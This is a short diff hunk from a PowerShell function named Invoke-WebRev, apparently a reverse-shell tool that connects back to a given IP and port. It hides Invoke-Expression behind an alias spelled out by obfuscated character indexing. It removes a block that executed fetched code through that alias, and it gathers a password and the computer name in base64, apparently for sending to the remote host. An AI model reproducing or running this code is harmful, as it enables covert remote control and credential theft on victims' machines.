@@ -33,12 +33,6 @@ function Invoke-WebRev{
     if ($ssl) { $url="https://" + $ip + ":" + $port + "/"; } else { $url="http://" + $ip + ":" + $port + "/"; }
     
     $x = "taleska-ei-vrixeka"; Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158]);
-    
-    try
-    {
-        $data = New-Funct;
-        taleska-ei-vrixeka $data;
-    } catch {};
 
     $pwd_b64 = getPwd;
     $hname = toBase64 -str "$env:computername";
